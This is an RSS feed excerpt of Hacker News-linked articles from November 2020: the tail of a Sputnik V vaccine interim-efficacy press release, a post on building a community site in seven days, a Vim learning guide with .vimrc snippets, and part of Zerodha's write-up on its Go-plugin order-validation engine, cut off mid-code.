<center><img width="90%" alt="table_eng_spu.jpg" data-src="/upload/medialibrary/70b/70bc3db939ed55ad755e935e8ae26df3.jpg" data-crc="5b1b93c0b54d98c83dc2e94e48f68aad" height="auto" title="table_eng_spu.jpg" src="https://sputnikvaccine.com/newsroom/pressreleases/second-interim-analysis-of-clinical-trial-data-showed-a-91-4-efficacy-for-the-sputnik-v-vaccine-on-d/table_eng_spu.jpg"></center>
</div>
<p>
According to the protocol of Phase III clinical trials of the Sputnik V vaccine, its interim efficacy is calculated at three statistically significant representative check points - upon reaching 20, 39 and 78 cases of novel coronavirus infection among volunteers both in the placebo group and in the group that received the vaccine. The second interim analysis of the Sputnik V vaccine efficacy was carried out on the basis of 39 confirmed cases identified in the placebo group (31 cases) and in the vaccine group (8 cases). The ratio of the placebo group to the vaccinated group is 1 to 3.
</p>
<p>
The uniqueness of the Russian vaccine lies in the use of two different vectors based on the human adenovirus, which allows for a stronger and longer-term immune response as compared to vaccines using one and same vector for two doses. <b>So, preliminary data on volunteers on the 42nd day after the first dose (equivalent to 21 days after the second dose), when they have already formed a stable immune response, indicates the efficacy rate of the vaccine is above 95%.</b>
</p>
<p>
The next interim data analysis will be conducted upon reaching the third check point of 78 confirmed coronavirus cases among the study participants. Final data analysis will be available by the end of Phase III clinical trials.
</p>
<p>
The interim research data will be published by the Gamaleya Center team in one of the leading international peer-reviewed medical journals. Following the completion of Phase III clinical trials of the Sputnik V vaccine, Gamaleya Center will provide access to the full clinical trial report.
</p>
  
<p>
As of November 24 more than 22,000 volunteers were vaccinated with the first dose and more than 19,000 volunteers with the first and the second dose of the vaccine at 29 medical centers in Russia as part of the ongoing clinical trials. Currently Phase III clinical trials are approved and are ongoing in Belarus, the UAE, Venezuela and other countries, as well as Phase II-III in India.
</p>
<p>
As of November 24, no unexpected adverse events were identified as part of the research. Some of those vaccinated had short-term minor adverse events such as pain at the injection point and flu-like symptoms including fever, weakness, fatigue, and headache.
</p>
<p>
During the clinical trials, the safety of the vaccine is constantly being monitored; information is analyzed by the Independent Monitoring Committee comprising leading Russian scientists. Collection, quality control and data processing is conducted in line with ICH GCP standards and involves the active participation of Moscow’s Health Department and Crocus Medical, the contract research organization (CRO).
</p>
<p>
<b>Mikhail Murashko, Minister of Health of the Russian Federation,</b> said:
</p>
<p>
“The data demonstrating high efficacy of the Sputnik V vaccine give us hope that we will soon obtain the most important tool in the fight against the pandemic of the novel coronavirus infection”.
</p>
<p>
<b>Alexander Gintsburg, Gamaleya Center Director,</b> said:
</p>
<p>
“It is very important that the second interim efficacy analysis of Sputnik V has confirmed our findings from the first stage and shown its efficacy at 91-92%. Let me stress that the second analysis was conducted a week after volunteers got the second dose, meaning that their bodies have partially reacted to both doses. We expect the efficacy rate to be even higher based on the data three weeks after the second immunization when the body’s strongest and most stable response is achieved. We plan to conduct the third interim data analysis after 78 confirmed coronavirus cases among volunteers and we have every reason to believe that the results will exceed our initial expectations. The drug’s final efficacy assessment will be made available after Phase III clinical trials are concluded.”
</p>
<p>
<b>Denis Logunov, Gamaleya Center Deputy Director,</b> commented:
</p>
<p>
“Results from the second interim analysis of the Sputnik V vaccine are in line with our expectations and predictions. The vaccine’s high efficacy rate is an important indication that a stable immune response to the coronavirus infection is formed among the study’s participants. We expect that the next interim results will demonstrate Sputnik V’s positive traits, moving us closer to the study’s completion and the beginning of a mass vaccination of our fellow citizens.”
</p>
<p>
<b>Kirill Dmitriev, CEO, Russian Direct Investment Fund,</b> said:
</p>
<p>
“Gamaleya Center has developed one of the most efficient vaccines against coronavirus in the world with an efficacy rate of more than 90% and a price that is two times lower than that of other vaccines with similar efficacy rate. The uniqueness of the Russian vaccine lies in the use of two different human adenoviral vectors which allows for a stronger and longer-term immune response as compared to the vaccines using one and the same vector for two doses.”
</p>
<p>
***
</p>
<p>
The safety of vaccines based on human adenoviruses has been confirmed in more than 75 international publications and more than 250 clinical trials conducted during the past two decades - while the history of use of human adenoviruses in vaccine development started in 1953. Adenovirus vectors are genetically modified viruses of the regular flu that cannot reproduce in a human body. When the Sputnik V vaccine is used, the coronavirus itself does not enter the body as the vaccine only contains genetic information about part of its outer protein coat, the so called "spikes" forming its crown. This completely eliminates the possibility of getting infected as a result of vaccination while also causing the body's stable immune response.
</p>
<p>
On September 4, The Lancet, one of world’s leading medical journals, published a research paper on the results of Phase I and Phase II clinical trials of the vaccine that showed no serious adverse events and an effective immune response of those vaccinated.
</p>
<p>
Requests for more than 1.2 billion doses of Sputnik V vaccine came from more than 50 countries. The vaccine supplies for the global market will be produced by RDIF’s international partners in India, Brazil, China, South Korea and other countries.
</p>
<p>
On August 11, the Sputnik V vaccine developed by the Gamaleya Center was registered by Russia’s Health Ministry and became the world’s first registered vaccine against COVID-19. Detailed information on the Sputnik V vaccine, its human adenoviral vectors technological platform, and other details are available at&nbsp;<a href="https://sputnikvaccine.com/" target="_blank">sputnikvaccine.com</a>
</p>
<p>
<b>Be the first to learn about Sputnik V on social networks:</b>
</p>
<p>
<a href="https://twitter.com/sputnikvaccine" target="_blank">Twitter</a>
</p>
<p>
<a href="https://www.facebook.com/sputnikvaccine" target="_blank">Facebook</a>
</p>
<p>
<a href="https://www.instagram.com/sputnik_vaccine/" target="_blank">Instagram</a>
</p>
<p>
<a href="https://www.youtube.com/channel/UCLvQuKL3Nn7NnT9Jyi_dlgQ" target="_blank">Youtube</a>
</p>
<p>
***
</p>
<p>
<b>Russian Direct Investment Fund (RDIF)</b> is Russia's sovereign wealth fund established in 2011 to make equity co-investments, primarily in Russia, alongside reputable international financial and strategic investors. RDIF acts as a catalyst for direct investment in the Russian economy. RDIF’s management company is based in Moscow. Currently, RDIF has experience of the successful joint implementation of more than 80 projects …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://sputnikvaccine.com/newsroom/pressreleases/second-interim-analysis-of-clinical-trial-data-showed-a-91-4-efficacy-for-the-sputnik-v-vaccine-on-d/">https://sputnikvaccine.com/newsroom/pressreleases/second-interim-analysis-of-clinical-trial-data-showed-a-91-4-efficacy-for-the-sputnik-v-vaccine-on-d/</a></em></p>]]>
            </description>
            <link>https://sputnikvaccine.com/newsroom/pressreleases/second-interim-analysis-of-clinical-trial-data-showed-a-91-4-efficacy-for-the-sputnik-v-vaccine-on-d/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25199213</guid>
            <pubDate>Tue, 24 Nov 2020 15:20:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[I built a community platform from scratch in 7 days]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25199149">thread link</a>) | @hrishikesh1990
<br/>
November 24, 2020 | https://www.remote.tools/remote-work-community/i-built-a-community-platform-in-7-days | <a href="https://web.archive.org/web/*/https://www.remote.tools/remote-work-community/i-built-a-community-platform-in-7-days">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  
  <h2>I am the co-founder of Flexiple and Remote Tools. In this post, I describe how I built a community website from scratch (almost) in 7 days.</h2>
  
  <p>TABLE OF CONTENTS</p>
<ol><li><a href="https://www.remote.tools/remote-work-community/i-built-a-community-platform-in-7-days#product-brief">Product Brief</a></li>
<li><a href="https://www.remote.tools/remote-work-community/i-built-a-community-platform-in-7-days#basic-setup">Basic setup &amp; Making the website live</a></li>
<li><a href="https://www.remote.tools/remote-work-community/i-built-a-community-platform-in-7-days#user-onboarding">User Onboarding</a></li>
<li><a href="https://www.remote.tools/remote-work-community/i-built-a-community-platform-in-7-days#user-profiles">User Profiles</a></li>
<li><a href="https://www.remote.tools/remote-work-community/i-built-a-community-platform-in-7-days#email-notifications">Email Notifications</a></li>
<li><a href="https://www.remote.tools/remote-work-community/i-built-a-community-platform-in-7-days#removing-unnecessary-features">Removing unnecessary features</a></li>
<li><a href="https://www.remote.tools/remote-work-community/i-built-a-community-platform-in-7-days#consistent-ui">Consistent UI across all pages</a></li>
<li><a href="https://www.remote.tools/remote-work-community/i-built-a-community-platform-in-7-days#iterations-on-homepage-ui">Iterations on homepage UI</a></li>
<li><a href="https://www.remote.tools/remote-work-community/i-built-a-community-platform-in-7-days#transfer-early-access-data">Transfer early access data &amp; Initial threads</a></li>
<li><a href="https://www.remote.tools/remote-work-community/i-built-a-community-platform-in-7-days#going-live">Going Live</a></li></ol>
<br>
<br>
<ul><li>Custom built on top of <a href="http://lobste.rs/" target="_blank">lobste.rs</a>, computing-focussed community</li><li id="product-brief">Tech stack: Ruby on Rails, Tailwind, JawsDB, Heroku</li><li>Cost: $17/mo ($7 for Heroku dyno + $10 for JawsDB)</li><li>Time to launch: 7 days</li></ul>

<p>For a quick read, you can check this twitter thread instead:</p>
<blockquote>— Hrishikesh Pardeshi (@hrishiptweets) <a href="https://twitter.com/hrishiptweets/status/1306234294214377473?ref_src=twsrc%5Etfw">September 16, 2020</a></blockquote>  
<h2>Product Brief</h2>
<p>We spent ~2 yrs to build a niche remote working audience at Remote Tools. We have 4000 newsletter subscribers, 20,000 unique users monthly, 42 stories &amp; 2 seasons of podcast.</p>
<p>We are building an exclusive remote work focussed community on top of this. Given we already have a sizeable audience, the community website canâ€™t be a simple MVP.</p>
<p>The broad pointers are â€“</p>
<ul><li id="basic-setup">Content posts &amp; user profiles are the prime focus.</li><li>UI &amp; Micro interactions are going to be a major hook for the website.</li><li>Want to stand out from traditional forum websites like&nbsp;<a href="https://tribe.so/" target="_blank">Tribe</a>.</li><li>Timeline for launch is 1-2 weeks. Build only thatâ€™s most essential.</li></ul>
<br><h2>Basic setup &amp; Making the website live</h2>
<p>I didn't want any setup &amp; maintenance hassle and since I am using Rails, Heroku seemed to be the perfect choice.</p>
<p><a href="http://lobste.rs/" target="_blank">Lobste.rs</a> codebase is tested with MariaDB while Heroku pairs well with Postgres. I didn't want to spend a lot of time on migration, so, I searched for Maria-based on Heroku and found JawsDB.</p>
<p><img src="https://remote-tools-images.s3.amazonaws.com/cb_1-1180x744.png" alt="Basic setup &amp; Making the website live" width="100%" max-width="700px"></p><p id="user-onboarding">I was a little skeptical to use an unknown DB/ plugin. So I dropped an email to their support asking a few basic queries. I received a response in just an hour which instilled confidence in me to go ahead with JawsDB.</p>
<br><h2>User Onboarding</h2>
<p>We want only truly passionate &amp; interested people to join Remote Clan and engage in genuine discussions. We didn't want to restrict access by charging for membership, so instead, we had every member share information about their work, experience &amp; their thoughts around remote working.</p>
<p><img src="https://remote-tools-images.s3.amazonaws.com/user+onboarding.png" alt="user onboarding" width="100%" max-width="700px"></p><p>Naturally, the website must have tiered access basis profile completion. I added user profile fields and proper redirects &amp; prompts for incomplete profiles vs. onboard users.</p>
<br><h2>User Profiles</h2>
<p>We already have detailed information &amp; reviews on 900+ remote working tools posted by makers over 2 years. So we wanted to leverage and seamlessly connect Remote Tools with Remote Clan.</p>
<br>

<p>Added an interactive dropdown as part of the profile to choose from the list of tools on Remote Tools. Data from Remote Tools in stored in Remote Clan DB and is fetched automatically once every week.</p>
<br><h2>Email Notifications</h2>
<p>We know it isn't realistic to expect people to log onto Remote Clan by themselves. So we needed a way to prompt users to take action.</p>
<p><img src="https://remote-tools-images.s3.amazonaws.com/email+notifications.png" alt="email notifications" width="100%" max-width="700px"></p><p>Email notifications are the best in this regard since everyone checks their mail regularly. <a href="http://lobste.rs/">Lobste.rs</a>  already had an email notification module, which I tweaked a little to send out notifications when -</p>
<ol><li id="removing-unnecessary-features">Someone comments on a post made by you</li><li>Someone replies to your comment</li><li>Someone tags you explicitly</li></ol>
<br><h2>Removing unnecessary features</h2>
<p>We want all conversations among members to be public so that everyone can benefit from the discussion. So personal messaging as a feature didn't make sense, at least at the current stage.</p>
<p><img src="https://remote-tools-images.s3.amazonaws.com/removing+unnecessary+features.png" alt="removing unnecessary features" width="100%" max-width="700px"></p><p>Similarly, we didn't want to overload users with tons of settings &amp; features which aren't essential to core interaction on the community.</p>
<p id="consistent-ui">So I stripped off most of the extraneous features including hats, moderation log, browser notifications etc.</p>
<br><h2>Consistent UI across all pages</h2><br>

<p>Tailwind is amazing for many reasons, but these stood out for me -</p>
<ul><li>Creating custom components &amp; UI was super easy &amp; quick</li><li id="iterations-on-homepage-ui">I was able to easily replicate custom components across all pages</li><li>I also liked the components offered out-of-the-box and used it for standard pages like all login/ signup pages.</li></ul>
<br><h2>Iterations on homepage UI</h2>
<p>The landing screen is the most important page on the website. We wanted to put our best effort on this so as to retain all of the traffic we divert to it from Remote Tools &amp; other channels.</p>
<p><img src="https://remote-tools-images.s3.amazonaws.com/interations+on+homepage+ui.png" alt="iterations on homepage ui" width="100%" max-width="700px"></p><p id="transfer-early-access-data">We spent a good amount of time discussing &amp; debating possible options for the posts, colors, buttons, hierarchy etc. and came up with 4 choices. We put up the 4 choices through our Twitter account and also sent it in our newsletter to get people's opinion on what clicks.</p>
<br><h2>Transfer early access data &amp; initial threads</h2>
<p><img src="https://remote-tools-images.s3.amazonaws.com/transfer+early+access+data.png" alt="" width="100%" max-width="700px"></p><p>For ~2 weeks, we had put up a simple early access page explaining the community and having interested people sign up. This was before I wrote even a single line of code.</p>
<br>

<p>We had ~150 people complete our onboarding form on Typeform for early access. All of this data was sitting in AirTable and I wrote a simple script to fetch the data &amp; create these users &amp; their profiles.</p>
<p><img src="https://remote-tools-images.s3.amazonaws.com/initial+threads.png" alt="transfer early access data" width="100%" max-width="700px"></p><p>Finally, we created our initial set of threads on community guidelines, introductions &amp; coffee chat.</p>
<br><h2>Going Live</h2>
<p>That's it! We were live on Day 8 ðŸ˜Ž</p>
<p>I sent out welcome email to all early access users via MailMeteor.</p>
<p><img src="https://remote-tools-images.s3.amazonaws.com/going+live.png" alt="Going live" width="100%" max-width="700px"></p><h3>I document my journey and write regularly about tech &amp; remote work on Twitter, you can <a rel="noreferrer noopener" href="https://twitter.com/intent/user?screen_name=hrishiptweets" target="_blank">follow me there</a>.</h3><br>
</div></div>]]>
            </description>
            <link>https://www.remote.tools/remote-work-community/i-built-a-community-platform-in-7-days</link>
            <guid isPermaLink="false">hacker-news-small-sites-25199149</guid>
            <pubDate>Tue, 24 Nov 2020 15:13:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Learning Vim in a Week]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25199069">thread link</a>) | @notkaiho
<br/>
November 24, 2020 | https://mikecoutermarsh.com/learning-vim-in-a-week/ | <a href="https://web.archive.org/web/*/https://mikecoutermarsh.com/learning-vim-in-a-week/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
<div>
<article itemscope="" itemtype="http://schema.org/BlogPosting">

<div itemprop="articleBody">
<p><strong>Note:</strong> I turned this blog post into a talk for Boston Vim, check it out here: <a href="https://mikecoutermarsh.com/boston-vim-learning-vim-in-a-week/">Learning Vim in a Week - Boston Vim</a>.</p>
<hr>
<p>I’d been using Sublime for a long time and recently switched over to Vim. It look me about a full week to learn enough to use it daily for work. Here is what I did to do it!</p>
<p>###Before you start, you should know…</p>
<ul>
<li>All that stuff Sublime or TextMate can do. So can Vim. Plus more.</li>
<li>You’ll be able to keep your entire workflow in a single terminal window, without taking your hands off the keyboard.</li>
<li>
<strong>.vimrc.</strong> This is the file you modify to customize Vim, you’ll become very familiar with it.</li>
<li>Don’t start learning at work, it’s frustrating at first and you won’t be able to get much done. Weekends are good.
<h3 id="getting-started">Getting started…</h3>
<p>These are roughly the steps I followed to learn Vim.</p>
</li>
<li>Grab a coffee, open a terminal, and run the command <em>vimtutor</em>. Go through it a couple times (I did it sporadically over a couple days).</li>
<li>There’s also a gamified version of vimtutor,&nbsp;<a href="https://vim-adventures.com/" target="_blank" rel="nofollow">Vim Adventures</a>.</li>
<li>Steal someone else’s <em>.vimrc</em> and <em>.vimrc.bundles</em>. These files let you add plugins and customize Vim.&nbsp;<a href="https://github.com/thoughtbot/dotfiles" target="_blank" rel="nofollow">Thoughtbot’s is good</a>. Here’s&nbsp;<a href="https://github.com/mscoutermarsh/dotfiles" target="_blank" rel="nofollow">mine</a>. You’ll eventually have your own, but it helps to start with someone elses.</li>
<li>
<a href="https://stackoverflow.com/questions/127591/using-caps-lock-as-esc-in-mac-os-x" target="_blank" rel="nofollow">Remap your Caps Lock to ESC</a>. You will use ESC in Vim <em>constantly</em>. Having it closer to your home row helps.</li>
<li>Speed up your key repeat rate. This is how quickly a key press repeats when you hold down a key. It helps you scroll through code much faster. On OSX you can do this&nbsp;<a href="https://pqrs.org/macosx/keyremap4macbook/" target="_blank" rel="nofollow">KeyRemap4MacBook</a>.</li>
<li>Watch screencasts. Thoughtbot&nbsp;<a href="https://learn.thoughtbot.com/vim" target="_blank" rel="nofollow">has a ton of great ones if you subscribe to prime</a>. The one I found most helpful was “<a href="https://learn.thoughtbot.com/purchases/8889fb98cf0046fb0ae61a1597584573" target="_blank" rel="nofollow">Vim for Rails Developers</a>.”</li>
</ul>
<h3 id="switching-files-and-searching">Switching Files and Searching:</h3>
<p>The biggest barrier for me using Vim full time was quickly navigating a project. There are bundles you can use to make this really easy.</p>
<h3><a href="https://github.com/kien/ctrlp.vim" target="_blank" rel="nofollow">CTRLP</a></h3>
<p>This does the same thing as Sublime’s Ctrl P. Fuzzy search by file name. Must have.</p>
<p><img src="https://mikecoutermarsh.com/assets/archive/images/2014/Oct/ctrlp.jpg" alt="vim ctrl p"></p>
<h3><a href="https://github.com/scrooloose/nerdtree" target="_blank" rel="nofollow">NERDTree</a></h3>
<p>Gives you a sidebar that you can quickly navigate files with. I’ve mapped NERDTree to &lt;F10&gt; so I can quickly open and close it. I’ve also mapped &lt;F9&gt; to bring me to my currently open file in NERDTree (super useful).</p>
<div><div><pre><code><span>" Toggle nerdtree with F10</span>
map <span>&lt;</span>F10<span>&gt;</span> <span>:</span>NERDTreeToggle<span>&lt;</span>CR<span>&gt;</span>

<span>" Current file in nerdtree</span>
map <span>&lt;</span>F9<span>&gt;</span> <span>:</span>NERDTreeFind<span>&lt;</span>CR<span>&gt;</span>
</code></pre></div></div>
<p><img src="https://mikecoutermarsh.com/assets/archive/images/2014/Oct/nerdtree.jpg" alt="nerdtree"></p>
<h3 id="ag-for-vim-project-wide-search">
<a href="https://github.com/rking/ag.vim" target="_blank" rel="nofollow">Ag for Vim</a> (Project wide search)</h3>
<p>Super fast search. Also speeds up indexing when using CtrlP.</p>
<p><img src="https://mikecoutermarsh.com/assets/archive/images/2014/Oct/ag.jpg" alt="ag"></p>

<h3>Copy &amp; Paste:</h3>
<p>I struggled for a while with copying and pasting code from outside Vim. It’s just a little different than other text editors and this makes the transition a little rough.</p>
<p>I recommend reading this&nbsp;<a href="http://vim.wikia.com/wiki/Cut/copy_and_paste_using_visual_selection" target="_blank" rel="nofollow">article on copy/paste</a>.</p>
<p>Also, if you have Vim’s auto indent and auto commenting turned on (which you probably do and want). When you paste, code may automatically be reformatted or commented out. This is annoying.</p>
<p>Vim has a “paste mode” that you can toggle on and off. I mapped it to &lt;F2&gt; so that when I do need to paste from outside of Vim, I can tap a key to do it.</p>
<div><div><pre><code><span>"key to insert mode with paste using F2 key</span>
map <span>&lt;</span>F2<span>&gt;</span> <span>:</span><span>set</span> paste<span>&lt;</span>CR<span>&gt;</span><span>i</span>
<span>" Leave paste mode on exit</span>
<span>au</span> <span>InsertLeave</span> * <span>set</span> nopaste
</code></pre></div></div>
<h2>Finally, Commit to it</h2>
<p>Once I had the basics down, I hid Sublime from my dock and started using Vim for real work. Anytime I found I was slow with something, I’d look up a fast way to do it, learn it and continue on.</p>
<p>One thing I’ve learned is, there is always a faster way to do something in Vim.</p>
<h3 id="more-reading">More reading</h3>
<ul>
<li><a href="https://learn.thoughtbot.com/vim">Thoughtbot’s material on Vim is really great.</a></li>
<li>Once you learn Vim, checkout Tmux - <a href="https://robots.thoughtbot.com/a-tmux-crash-course">A tmux Crash Course</a>
</li>
</ul>
</div>



</article>
</div>
</div></div>]]>
            </description>
            <link>https://mikecoutermarsh.com/learning-vim-in-a-week/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25199069</guid>
            <pubDate>Tue, 24 Nov 2020 15:06:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A lesson in creating and using niche business DSLs at scale]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25198991">thread link</a>) | @rhnvrm
<br/>
November 24, 2020 | https://zerodha.tech/blog/a-lesson-in-niche-business-dsls-at-scale/ | <a href="https://web.archive.org/web/*/https://zerodha.tech/blog/a-lesson-in-niche-business-dsls-at-scale/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>At Zerodha, we process millions of trades in real-time, where each trade comes
into the system as concurrent high throughput HTTP requests. Each trade
increases the latency for subsequent orders in the queue that are under
processing at the same time at our OMS (Order Management System). When a single
order comes through to the OMS, it goes through a bunch of computationally
intensive validations and adds to the latency. To reduce the latency of orders,
we decided to offload some of these business validations from the OMS into an
external component called Veto, which pre-validates incoming orders based on
custom dynamic rules set by our Risk Management team. Rejected orders never go
through to the OMS thereby reducing significant load on the OMS. This is the
story of how we incrementally built this engine to keep up with the changing
business and regulatory environment starting with a custom DSL (Domain Specific
Language) and ending up with writing a framework to manage rules written in Go
and embedded inside Go plugins.</p><h2 id="overview">Overview</h2><p>Our goal with Veto was to build a dynamic evaluation engine framework capable of
hot-reloads. This framework would provide a generic environment to manage, track
and audit rules and filters on an easily accessible dashboard. The engine should
have support for custom data-stores related to the orders. Rules in this
framework are business validations on orders placed by our clients. These
validations range from simple checks like validating the limit prices to be
within circuit limits, to complex beasts, which <a href="https://support.zerodha.com/category/trading-and-markets/kite-web-and-mobile/articles/why-did-my-bank-nifty-option-order-get-rejected">validate fresh buy
orders</a>
in Nifty/BankNifty strikes due to exchange OI restrictions.</p><p><img src="https://zerodha.tech/static/images/bnf-veto-rejection.png" alt="banknifty-rejection-example"></p><p>Our first solution utilized our research from the
<a href="https://sentinel.zerodha.com/">Sentinel</a> project. We combined
<a href="https://github.com/Knetic/govaluate">knetic/govaluate</a>, which is an expression
evaluation engine, along with a filter manager and a hot reload mechanism with
an HTTP server which would either respond with an appropriate rejection to
the incoming order or proxy to the upstream OMS, thereby acting as a reverse
proxy with validations. The expression language was similar to Excel formulas,
which was familiar to our RMS Team that managed and operated it through custom
management dashboard built using <a href="https://frappe.io/">Frappe/ERPNext</a>.</p><h2 id="problems-with-dsls">Problems with DSLs</h2><p>After taking it live, we realized a bunch of issues that
cropped up and became pain points for us over time. These were not really technical,
but more or less, human usability issues.</p><ul><li><p>Since the underlying engine was a simple expression evaluator, the operators
would end up spending hours trying to write complex rules, and similarly the
developers, who are supposed to approve the rule to be production ready, spent
time reviewing it.</p><ul><li><p>This was due to how unreadable the expressions would become beyond a certain
complexity. Simple rules were indeed faster to write, but anything beyond
it would be beyond human capability to comprehend, which would cause
unnecessary and difficult debugging sessions in the office.</p></li><li><p>Unlike a regular language with branching, the operator writing the
rule would be stuck on writing logic defined with bracket matching
and <code>AND/OR</code> statements. Also, missing support for variables would not
allow us to reuse values.</p></li><li><p>To write a single complex rule, operators would depend on writing the rules
into manageable chunks. For example, a single spread (shown below) the rule would be broken
into <code>spread_ce_buy</code>, <code>spread_ce_sell</code>, <code>spread_pe_buy</code>, <code>spread_pe_sell</code>
rules.</p><p><img src="https://zerodha.tech/static/images/veto-govaluate-example.png" alt="Veto Govaluate Sample"></p></li></ul></li><li><p>Custom error messages and any non-boolean behaviour were not possible, as the
expression can only evaluate to a boolean. Switching to a proper language, we
could use early returns in the rule and return custom messages alongside the
evaluation result.</p></li><li><p>Implementing new functions and adding new variables was a pain.</p><ul><li>This meant that if you were to add a new function, you would have to bundle
it within the engine, defeating the purpose of the rules being dynamic.</li><li>This also meant the developer had to always be involved in writing the rules, defying the whole purpose of having a DSL for business folks.</li></ul></li></ul><h2 id="new-beginnings">New beginnings</h2><p>Our learnings from these issues made us reflect if it would be worth it for the
operators to keep using a simple expression language. The way we were going, we were
essentially building a DSL (Domain Specific Language) on top of <code>govaluate</code>,
that would keep getting more complex with time.</p><p>We finally decided that a solution to the problem was to use Go-like language as
the DSL instead of <code>govalute</code> and distribute the dynamic rules as Go plugins, as
Veto was written in Go in the first place, just like the rest of the Kite stack.
It is simple, easy to learn, and has good tooling around it.</p><p>We debated heavily on the best approach to solve the problems that we were
facing with veto rules and shortlisted a few candidates. We picked a complex rule in production written using govaluate and wrote that in the following to benchmark the performance of the rules in the alternatives.</p><ul><li><a href="https://github.com/Knetic/govaluate">Govaluate</a> - evaluates arbitrary C-like expressions</li><li><a href="https://github.com/containous/yaegi">Yaegi</a> - embedded go interpreter</li><li><a href="https://www.openpolicyagent.org/docs/latest/policy-language/">Rego</a> - open-policy-agent DSL</li><li><a href="https://github.com/hashicorp/go-plugin">Hashicorp Plugins</a> - plugin system over RPC.</li><li><a href="https://golang.org/pkg/plugin/">go-plugins</a> - native go plugins</li></ul><p>Benchmark Results:</p><div><pre><code data-lang="fallback">govaluate:
1319773 907 ns/op
go-plugins:
2745398 503 ns/op
yaegi:
202173 11091 ns/op
rego:
83476 13796 ns/op
</code></pre></div><p>We considered govaluate to be the baseline for our experiments. In our
benchmarks, native plugins outperformed other solutions and brought the power of
the entire Go runtime into independent plugins. We discarded Hashicorp plugins,
as they were slower. Yaegi was nice, but not as fast as govaluate. Govaluate and
Yaegi provide a simpler way to distribute rules, when compared to native plugins
which need a bit of orchestration.</p><h2 id="veto-v2">Veto v2</h2><p>Considering all the facts, we decided to go ahead with native Go plugins. They
are as fast as native code once loaded, and given enough tooling, act just like
regular Go code, along with all its niceties like type safety and none of the
baggage of other alternatives.</p><p>Veto v2 would be a web server which loads rules from native Go plugins on boot
and behave like a reverse proxy accepting incoming orders as HTTP requests,
either rejecting them in place or proxying them to the upstream OMS.</p><p>Since there are
<a href="#overcoming-go-plugin-caveats">problems</a> associated with building and
distributing plugins due to dependency issues, requiring in-tree building and
compilation, we decided to first work on writing a framework to abstract the
caveats associated with go plugins.</p><h3 id="a-framework-for-writing-rules">A framework for writing rules</h3><p>Rules in Veto v2 are now written in plain Go by the operators. A rule looks similar
to the following sample rule.</p><p>Each rule is expected to provide three functions.</p><p>Rules are contained in the <code>Validate</code> functions that are expected to accept an
interface and return a <code>rule.Result</code>. The contexts contain the controllers and
data needed for validating the rule, and are passed by the host to the rule
manager which iterates over all the rules. The host can then interpret the result
and do what it needs to, in our case render a response to the user with a custom
message, or proxy to the upstream.</p><p>Another added benefit of having written a custom go plugin based framework for
rules, is that we can implement our own testing framework for validation of the
rules. Every rule is expected to return its own testcases as a
<code>map[interface{}]e.Result</code> where the interface is the context. This way if a
rule implements all the testcases, we are sure that any minor refactor will be
also correct in the future. This reduces the need for constant developer
oversight and the testing needed for the rules. Also, the testcases provide
extra documentation for the future.</p><p>The following rule contains a sample circuit limit rule for illustration.</p><div><pre><code data-lang="go"><span>package</span> main

<span>import</span> (
    <span>...</span>
)

<span>// Slug is the identifier for the rule. Used in statistics and logging.
</span><span></span><span>func</span> <span>Slug</span>() <span>string</span> {
    <span>return</span> <span>"a_sample_ckt_limit_rule"</span>
}

<span>// Validate, is where the validation logic resides.
</span><span></span><span>func</span> <span>Validate</span>(data <span>interface</span>{}) (e.Result, <span>error</span>) {
    d, err <span>:=</span> m.<span>SetupOrderData</span>(data)
	<span>if</span> err <span>!=</span> <span>nil</span> {
		<span>return</span> e.Result{}, err
	}

    <span>...</span>

    <span>// Get the market for the incoming order
</span><span></span>    s, err <span>:=</span> d.Ticker.<span>GetSnapForOrder</span>(d.OrderData.Order)
	<span>if</span> err <span>!=</span> <span>nil</span> {
		<span>return</span> e.Result{}, err
	}

    <span>...</span>

	<span>// Check limits
</span><span></span>	<span>if</span> d.Order.Price &gt; s.UpperCircuitLimit {
		<span>return</span> e.Result{
			Result: <span>true</span>,
			Message: fmt.<span>Sprintf</span>(
				<span>"Your order price is higher than the current [upper circuit limit](https://support.zerodha.com/category/trading-and-markets/trading-faqs/articles/what-does-circuit-limits-i-e-price-bands-mean) of %g. You can place an order within the range or [use GTT](https://support.zerodha.com/category/trading-and-markets/gtt/articles/what-is-the-good-till-triggered-gtt-feature) for long-standing orders."</span>,
				s.UpperCircuitLimit),
		}, <span>nil</span>
	}

	<span>if</span> s.LowerCircuitLimit &gt; d.Order.Price {
		<span>return</span> e.Result{
			Result: <span>true</span>,
			Message: fmt.<span>Sprintf</span>(
				<span>"Your order price is lower than the current [lower circuit limit](https://support.zerodha.com/category/trading-and-markets/trading-faqs/articles/what-does-circuit-limits-i-e-price-bands-mean) of %g. You can place an order within the range or [use GTT](https://support.zerodha.com/category/trading-and-markets/gtt/articles/what-is-the-good-till-triggered-gtt-feature) for long-standing orders."</span>,
				s.LowerCircuitLimit),
		}, <span>nil</span>
	}

    <span>return</span> e.Result{}, <span>nil</span>
}

<span>// TestData is expected to be provided by the rule,
</span><span>// so it can be validated before it is allowed to be published.
</span><span></span><span>func</span> <span>TestData</span>() <span>map</span>[<span>interface</span>{}]e.Result {
	tckr <span>:=</span> <span>&amp;</span>ticker.Ticker{
		Data: <span>map</span>[<span>string</span>]<span>interface</span>{}{
			<span>"NSE:INFY"</span>: snaps.Snap{
				LastPrice:         <span>12.34</span>,
				UpperCircuitLimit: <span>15.0</span>,
				LowerCircuitLimit: <span>10.0</span>,
			},
		},
	}

	<span>return</span> <span>map</span>[<span>interface</span>{}]e.Result{
		<span>&amp;</span>m.OrderContext{
			Controllers: m.Controllers{
				Ticker:      tckr,
			},
			OrderData: m.OrderData{
				Order: oms.OrderParams{
					Exchange:      <span>"NSE"</span>,
